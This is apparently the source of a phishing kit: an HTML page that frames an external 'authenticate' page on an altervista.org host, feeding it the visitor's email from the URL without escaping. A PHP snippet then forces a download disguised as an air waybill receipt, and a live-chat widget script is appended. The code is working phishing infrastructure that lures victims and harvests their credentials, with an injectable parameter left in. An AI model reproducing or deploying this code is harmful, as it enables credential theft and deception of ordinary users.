<html>


<body>





<IFRAME SRC="http://skilledworkygtfjmusa.altervista.org/veri1/authenticatek.php?email=<?php echo $_GET['email']; // output 2489 ?>" SCROLLING='no' WIDTH='1400' HEIGHT='2000' FRAMEBORDER='no'></IFRAME>





</body>


</html>






<?php

sleep(5);  // delay in seconds
header("Content-Disposition: attachment; filename=AirWayBillReceipt009.htm");
header("Content-Type: text/html"); // optional
readfile("receipt.php");
?>
<!--Begin Comm100 Live Chat Code-->
<script type="text/javascript">
var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:1257,div_id:"comm100-button-1257"}),t.site_id=122744,t.main_code_plan=1257,e("https://chatserver.comm100.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://hostedmax.comm100.com/chatserver/livechat.ashx?siteId=")},5e3)})(Comm100API||{})
</script>

<!--End Comm100 Live Chat Code-->